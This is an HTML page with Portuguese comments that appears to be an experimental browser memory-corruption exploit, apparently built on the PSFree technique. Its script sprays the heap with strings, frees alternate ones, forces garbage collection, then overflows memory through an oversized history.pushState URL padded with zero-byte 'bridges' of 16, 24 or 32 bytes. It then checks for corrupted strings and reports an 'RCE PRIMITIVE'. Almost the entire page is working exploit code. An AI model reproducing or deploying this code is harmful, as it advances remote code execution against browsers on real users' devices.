<!DOCTYPE html>
<html>
<head>
    <title>Bridge Expander (Ponte Expandida)</title>
    <style>
        body { background-color: #000; color: #ff00ff; font-family: monospace; padding: 20px; }
        button { 
            font-size: 24px; padding: 20px; width: 100%; border: 2px solid #ff00ff; background: #111; color: #fff; cursor: pointer; margin-bottom: 20px;
        }
        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px;}
        .win { background-color: #ff00ff; color: #000; font-weight: bold; font-size: 1.6em; padding: 10px; border: 4px solid white; }
    </style>
</head>
<body>

    <h1>Bridge Expander</h1>
    <p>Testando pontes maiores de Zeros para pular o StructureID completo.</p>

    <button onclick="startExpander(16)">1. PONTE DE 16 BYTES</button>
    <button onclick="startExpander(24)">2. PONTE DE 24 BYTES</button>
    <button onclick="startExpander(32)">3. PONTE DE 32 BYTES</button>
    
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        const BASE_OFFSET = 709520; 
        const OVERFLOW_AMT = 1024 * 64; 

        // 1MB Alinhado (O que funcionou)
        const TARGET_SIZE = 1024 * 1024; 
        const PAYLOAD_SIZE = TARGET_SIZE - 24; 

        var victims = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let cls = type === 'win' ? 'class="win"' : '';
            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

        // Função do PSFree para criar string flat
        function createPSFreeString(size, index) {
            const u32 = new Uint32Array(1);
            u32[0] = index;
            const u8 = new Uint8Array(u32.buffer);
            const padLen = size - 4; 
            const pad = "B".repeat(padLen);
            return [pad, String.fromCodePoint(...u8)].join('');
        }

        async function startExpander(bridgeSize) {
            log(`--- TESTANDO PONTE DE ${bridgeSize} ZEROS ---`);
            
            // 1. WARMUP
            let dummyPayload = "W".repeat(BASE_OFFSET + 100); 
            history.replaceState("warmup", "warmup", "/" + dummyPayload);
            await sleep(100);

            // 2. SPRAY
            victims = [];
            const SPRAY_COUNT = 60;

            try {
                for(let i=0; i<SPRAY_COUNT; i++) {
                    let s = createPSFreeString(PAYLOAD_SIZE, i);
                    victims.push(s);
                }

                // 3. BURACOS
                log("Criando buracos...");
                for(let i=0; i<SPRAY_COUNT; i+=2) {
                    victims[i] = null;
                }

                await forceGC();

                // 4. EXPLOIT
                log(`Disparando Overflow (Ponte ${bridgeSize})...`);
                setTimeout(() => {
                    try {
                        let buffer = "A".repeat(BASE_OFFSET);
                        
                        // A PONTE EXPANDIDA
                        buffer += "\u0000".repeat(bridgeSize);
                        
                        // O ATAQUE
                        buffer += "\x01".repeat(OVERFLOW_AMT);
                        
                        history.pushState({}, "pwn", "/" + buffer);

                        log("Verificando...");
                        checkCorruption(PAYLOAD_SIZE);

                    } catch (e) {
                        log("Erro: " + e.message);
                    }
                }, 500);

            } catch(e) {
                log("Erro Memória: " + e.message);
            }
        }

        function checkCorruption(expectedLen) {
            let success = false;
            for(let i=1; i<victims.length; i+=2) {
                let s = victims[i];
                if(!s) continue;

                try {
                    let err = new Error(s);
                    let msg = err.message;

                    // SUCESSO (RCE)
                    if (msg.length !== expectedLen) {
                        log(`!!! JACKPOT !!! String ${i} Length: ${msg.length}`, 'win');
                        alert("RCE PRIMITIVE UNLOCKED!");
                        success = true;
                        break;
                    }

                    // SUCESSO PARCIAL (DADOS)
                    if (msg.charCodeAt(0) !== 66) { 
                        log(`[DADOS] Atingido com ponte de ${bridgeSize}. Header pulado demais?`, 'win');
                        success = true;
                        break;
                    }
                } catch(e) {}
            }
            if(!success) log("Nada atingido ou Crash evitado (mas sem RCE).");
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 800));
        }
    </script>
</body>
</html>
